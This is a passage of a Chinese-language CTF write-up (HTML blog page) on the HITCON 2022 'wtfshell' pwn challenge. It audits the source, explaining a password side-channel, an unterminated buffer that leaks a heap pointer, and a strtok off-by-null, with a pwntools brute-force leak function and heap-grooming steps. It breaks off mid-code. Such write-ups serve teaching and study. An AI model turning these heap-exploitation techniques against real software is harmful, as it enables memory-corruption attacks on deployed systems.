



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="wp" />


<link rel="canonical" href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/">



  <title>
hitcon2022-wtfshell - CTF赛题复现 |
Loτυs = 清風微醺 = 凌恒</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">hitcon2022-wtfshell
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-12-01 15:02:07">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-01T15:02:07+08:00">2022-12-01</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>34k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>30 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Loτυs</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://pic.imgdb.cn/item/63c25091be43e0d30ef41a48.webp">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 CTF赛题复现"><span itemprop="name">CTF赛题复现</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="Loτυs">
    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="清風微醺">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>首发于看雪：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjc1Mzc2Lmh0bQ==">https://bbs.kanxue.com/thread-275376.htm</span></p>
<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1>
<p>和 r3kapig 一起征战 hitcon2022，pwn 手坐大牢，wtfshell 这道题审了三小时源码，只看出来一个  <code>chk_pw</code>  侧信道 + <code>read_pw</code>  未置零，最终可以通过侧信道 leak 出一个 heap 地址，没有看出其余的洞，最终放弃。</p>
<p><code>wtfshell1</code>  最终解数为 4， <code>wtfshell2</code>  最终解数为 3。第一题解出来了第二题基本就解出来了。</p>
<p>感谢 <code>crazyman</code>  第二天来告诉我 wtfshell 的主要漏洞（strtok off by null），思考后脑子里出现了一套完整的利用思路。因此做出如下复现。</p>
<p>文章不太喜欢附图，大家多包涵，做出来难度还是蛮大的，因为即使知道了 <code>strtok-&gt;off-by-null</code> ，还是有非常多细节需要思考☹️。</p>
<p>应该是全球首发 wtfshell 的 wp 吧😎。</p>
<h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h2>
<p>题目提供了源码，一共 930 + 行，libc 为 <code>glibc2.36 3</code> ，由于 <code>glibc-all-in-one</code>  中找不到该版本 libc，因此我换了一个小版本，用 <code>glibc2.36 4</code>  进行复现。</p>
<h3 id="程序主要逻辑"><a class="markdownIt-Anchor" href="#程序主要逻辑">#</a> 程序主要逻辑</h3>
<p>程序实现了一个类似于 shell 交互，输入 <code>rtfm</code>  可以查看菜单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">πππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππ</span><br><span class="line">π	rtfm.			Read This Friendly Manual	π</span><br><span class="line">π	qq.			Quit Quietly			π</span><br><span class="line">π	lol,[-l].		List Of fiLes			π</span><br><span class="line">π	rip.[FILE]		Redirect InPut			π</span><br><span class="line">π	nsfw,FILE,PERM.		New Single File for Writing	π</span><br><span class="line">π	wtf,DATA,FILE.		Write data To File		π</span><br><span class="line">π	omfg,FILE.		Output My File Gracefully	π</span><br><span class="line">π	gtfo,FILE.		GeT the File Out		π</span><br><span class="line">π	ouo.			Output current User Out		π</span><br><span class="line">π	stfu,USER.		SeT new Friendly User		π</span><br><span class="line">π	asap,[USER].		ASsign A new Password		π</span><br><span class="line">π	sus,USER.		Switch USer			π</span><br><span class="line">π	shit.			SHell InformaTion		π</span><br><span class="line">π	irl.			Instantly Reset shelL		π</span><br><span class="line">πππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππ</span><br></pre></td></tr></table></figure>
<p>功能主要为：</p>
<ul>
<li>lol：展示所有 files 文件，加上 <code>-l</code>  命令可以查看①文件所属用户，②文件 size，③文件名。</li>
<li>rip：向指定文件末尾添加内容，采用 <code>realloc</code> + <code>strcat</code>  实现，其中 <code>realloc_size</code>  为 <code>data_size</code> +1, 防止 strcat 末尾 \x00 造成 off by null。</li>
<li>nsfw：创建文件，并定制其权限（rw）。</li>
<li>wtf：重新覆写文件内容，最大 size 为 0x400。</li>
<li>omfg：打印文件内容（若文件具有可读属性）。</li>
<li>gtfo：删除指定文件。</li>
<li>ouo：打印当前用户名。</li>
<li>stfu：添加新用户，可定义其 name。</li>
<li>asap：更改指定用户密码。其中调用的函数 <code>chk_pw</code>  存在 <code>侧信道</code> 泄露漏洞。</li>
<li>sus：登录后可更换用户。</li>
<li>irl：reset 所有内容：①清除所有用户结构体，②清空所有 file 结构体，③free 并重新申请 gbuff。</li>
<li>qq：退出程序前 free 掉 gbuff，close 了所有文件描述符，并且采用 <code>_exit</code>  退出。</li>
</ul>
<h3 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点">#</a> 漏洞点</h3>
<h4 id="侧信道"><a class="markdownIt-Anchor" href="#侧信道">#</a> 侧信道</h4>
<p>查看 <code>chk_pw</code>  函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_pw</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pw)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input;</span><br><span class="line">    <span class="keyword">int</span> pw_len = <span class="built_in">strlen</span>(pw);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pw_len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == pw_len) &#123; <span class="comment">// The last character must be a line break</span></span><br><span class="line">            <span class="keyword">return</span> input == <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// Ignore accidental line breaks</span></span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* If password mismatch, quit immediately */</span></span><br><span class="line">        <span class="keyword">if</span> (input != pw[i]) &#123;</span><br><span class="line">            <span class="comment">/* Read characters until &#x27;\n&#x27; */</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">terminate</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到逻辑为：</p>
<ul>
<li>逐字符判断密码是否正确，若不正确，读取输入直到 \n 后退出。</li>
<li>若字符正确则往后继续检查，途中若遇到 \n，直接利用 <code>i--</code>  来忽略</li>
</ul>
<p>当检查途中遇到不正确的字符，且 i 并未到达 <code>pw_len</code>  时，我们可以通过输入 \n 符是否退出 <code>chk_pw</code>  来判断当前密码字符是否正确。</p>
<p>且若密码不正确，输入 \n 退出 <code>chk_pw</code>  后会打印：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!chk_pw(gusers[i]-&gt;ushadow)) &#123;</span><br><span class="line">                <span class="comment">/* Clear data when error occurs */</span></span><br><span class="line">                bzero(gusers[i]-&gt;ushadow, PWMAX);</span><br><span class="line">                write_str(<span class="string">&quot;asap: pw1 ≠ pw2\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>因此我们可以通过接收字符来判断密码字符是否正确，达到侧信道爆破的目的。</p>
<h4 id="user结构体"><a class="markdownIt-Anchor" href="#user结构体">#</a> user 结构体</h4>
<p>查看 user 结构体：uname 堆指针跟在 ushadow 密码后。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> ushadow[PWMAX];</span><br><span class="line">    <span class="keyword">char</span> *uname;</span><br><span class="line">    <span class="keyword">int</span> uid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>查看 <code>read_pw</code>  函数：在读满 <code>PWMAX</code> size 的时候，并未在末尾置零，导致 <code>user-&gt;ushadow</code>  与 <code>user-&gt;uname</code>  指针连接。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_pw</span><span class="params">(<span class="keyword">char</span> *dest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> read_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (read_num &lt; PWMAX) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;dest[read_num], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dest[read_num] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            dest[read_num] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> read_num;</span><br><span class="line">        &#125;</span><br><span class="line">        read_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> read_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看 <code>chk_pw</code>  函数：判断密码位数是通过 <code>strlen</code>  来判断的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pw_len = <span class="built_in">strlen</span>(pw);</span><br></pre></td></tr></table></figure>
<p>因此结合起来，我们可以利用侧信道 + 结构体，来 leak 出一个堆地址。</p>
<h4 id="strtok-off-by-null"><a class="markdownIt-Anchor" href="#strtok-off-by-null">#</a> strtok-&gt;off by null</h4>
<p>main 函数中的 gbuff 是拿来储存我们的命令字符串的，大小为 0x400，对其有一个分割符处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_max(gbuff, GBSIZE);</span><br><span class="line"><span class="keyword">char</span> *token = strtok(gbuff, delim);</span><br></pre></td></tr></table></figure>
<p><code>strtok</code>  函数会不断往字符串后面遍历，直到遇到 <code>\x00</code>  截断，同时 <code>strtok</code>  会将查找到的隔断符 <code>delim</code>  设置为 <code>\x00</code> 。</p>
<p>查看隔断符 delim：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> delim[] = <span class="string">&quot;.,?!&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>其中！的 ascii 码值为 0x21，若我们能在 <code>gbuff</code>  0x400 大小的堆块里填入 0x408 个非零字符，同时在后面跟上一个 size 头低字节为 0x21 的堆块，即可通过 <code>strtok</code>  实现 <code>off-by-null</code> 。</p>
<h2 id="wtfshell1"><a class="markdownIt-Anchor" href="#wtfshell1">#</a> wtfshell1</h2>
<h3 id="泄露堆地址"><a class="markdownIt-Anchor" href="#泄露堆地址">#</a> 泄露堆地址</h3>
<p>首先申请一个 <code>user</code>  结构体，填满其 pwd。本地 gdb 调试之后发现这样 <code>user-&gt;uname</code>  指针末尾为 0，因此可以申请两个 <code>user</code>  结构体，第一个用作填充，使第二个 <code>user</code>  结构体的 <code>user-&gt;uname</code>  指针末尾不为 0。</p>
<p>由于堆地址最低字节固定，不用泄露：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="构造off-by-null"><a class="markdownIt-Anchor" href="#构造off-by-null">#</a> 构造 off-by-null</h3>
<p>堆风水真的给👴整麻了。😭😭😭😭😭</p>
<h4 id="得到一个填满的gbuff堆块"><a class="markdownIt-Anchor" href="#得到一个填满的gbuff堆块">#</a> 得到一个填满的 gbuff 堆块</h4>
<p>首先我们需要得到一个被填满 0x408 非零字节的 <code>gbuff</code>  堆块。</p>
<p>整个程序 free 只能通过两种方式：①xrealloc，②xfree。</p>
<p>其中 xfree 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xfree</span><span class="params">(<span class="keyword">void</span> *ptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> size = malloc_usable_size(ptr);</span><br><span class="line">    bzero(ptr, size);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>malloc_usable_size</code>  函数会获取该 heap 所有能写的 size，也就是说紧邻该堆块的下一个堆块的 <code>prev_size</code>  也会被算进来清零，因此我们要避开 xfree，只能用 <code>xrealloc</code>  来 free。</p>
<p><code>xrealloc</code>  其实就是调用 <code>realloc</code>  函数，当我们申请一个大于当前堆块 size 的堆块时， <code>realloc</code>  会 free 掉当前堆块，然后重新申请堆块，这个过程中是不会清空 free 的堆块内容的。</p>
<p>小堆风水一波，得到一个填满 0x408 非零字节的 <code>gbuff</code>  堆块步骤为：</p>
<ol>
<li>先利用 rip 申请一个 0x400 大小的堆块，然后利用 xrealloc 不断扩充，直到 size 为 0x1000。然后 realloc (0x1100) free 掉该 unsortedbin（必须用 xrealloc 去 free，用 xfree 会清空堆块内容）。</li>
<li>申请一个小堆块隔开 <code>unsortedbin</code>  与 <code>top_chunk</code> 。</li>
<li>申请一个 0x400 大小的堆块到 unsortedbin 中。</li>
<li>提前填满 0x400 大小的 <code>tcache_list</code> 。</li>
<li>调用 <code>cmd_irl</code>  来 free 掉 <code>gbuff</code> ，由于 <code>tcache_list</code>  已经被填满，因此 free 掉的 <code>gbuff</code>  不会进入 <code>tcache_list</code> ，会变成 unsortedbin，然后下一次申请，会申请 <code>tcache_list</code>  中第一个空闲堆块，也就是我们之前填满非零字节的一个堆块。这样就能获得一个填满 0x408 字节的 <code>gbuff</code> 。</li>
</ol>
<h4 id="构造off-by-null-2"><a class="markdownIt-Anchor" href="#构造off-by-null-2">#</a> 构造 off by null</h4>
<p>接下来就很简单能够想到在 <code>gbuff</code>  的下面申请一个堆块， <code>off-by-null</code>  之后利用，以下文章将该堆块命名为 <code>off-by-null-chunk</code></p>
<p>在思考这一段时，卡了我非常久，特别鸣谢 <code>winmt</code>  师傅和 <code>ln3</code>  师傅和我激情讨论，一次次点醒我。</p>
<h5 id="遇到的问题"><a class="markdownIt-Anchor" href="#遇到的问题">#</a> 遇到的问题</h5>
<h6 id="prev_size"><a class="markdownIt-Anchor" href="#prev_size">#</a> prev_size</h6>
<p>① <code>off-by-null-chunk</code>  的 <code>prev_size</code>  我们无法控制。</p>
<p>首先我们知道， <code>off-by-null-chunk</code>  的 <code>prev_size</code>  是被填满了八字节的，不然无法触发 <code>strtok</code>  然后触发 <code>off-by-null</code> 。</p>
<p><code>gbuff</code>  堆块与 <code>off-by-null-chunk</code>  是紧挨的，然后我们如果要更改 <code>off-by-null-chunk</code>  的 <code>prev_size</code> ，就必须通过 <code>gbuff</code>  来更改。</p>
<p>我们知道，我们只能控制 <code>gbuff</code>  堆块的前 0x400 个字节，更改不了 <code>off-by-null-chunk</code>  的 <code>prev_size</code> 。</p>
<p><strong>尝试思路一</strong>：首先肯定要触发 <code>off-by-null</code> ，我想的是触发 <code>off-by-null</code>  之后，再次调用 <code>cmd_irl</code>  来 free 掉 <code>gbuff</code> ，然后申请一个普通 chunk，size 为 0x408，这样就能更改到 <code>off-by-null-chunk</code>  的 <code>prev_size</code> 。</p>
<p>但是这样是显然行不通的，因为 free 掉 <code>gbuff</code>  的时候，会判断 <code>gbuff</code>  下面那个堆块的 use 状态，由于已经 <code>off-by-null</code> ，会触发 <code>off-by-null</code> ，但是我们的 <code>prev_size</code>  不合法，这样会导致程序出错。</p>
<p><strong>尝试思路二</strong>：我详细查阅了 strtok 的作用，如果出现连续的 delim 分隔符会如何处理，看能不能同时利用 strtok 将 <code>gbuff</code>  第 0x400-0x408 个字节中非 <code>prev_size</code>  部分清空，同时触发 <code>off-by-null</code> 。最终也以失败告终。</p>
<p><strong>最终思路</strong>：再次审查源码后，发现 <code>cmd_rip</code>  函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">cmd_rip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);#<span class="meta">#this!</span></span><br><span class="line">    <span class="keyword">char</span> *rbuff = xmalloc(SBSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect input to stdout */</span></span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        read_max(rbuff, SBSIZE);</span><br><span class="line">        write_str(rbuff);</span><br><span class="line">        write_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Redirect input to a file */</span></span><br><span class="line"></span><br><span class="line">    remove_slash(fname);<span class="meta">#that!</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;rip: flag = ∅\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Special case: flag1 cannot be altered */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fname, <span class="string">&quot;flag1&quot;</span>)) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;rip: ¬ perm\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 */</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;rip: ¬ perm\n&quot;</span>);</span><br><span class="line">                xfree(rbuff);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read_max(rbuff, SBSIZE);</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(rbuff) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata) + <span class="built_in">strlen</span>(rbuff) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                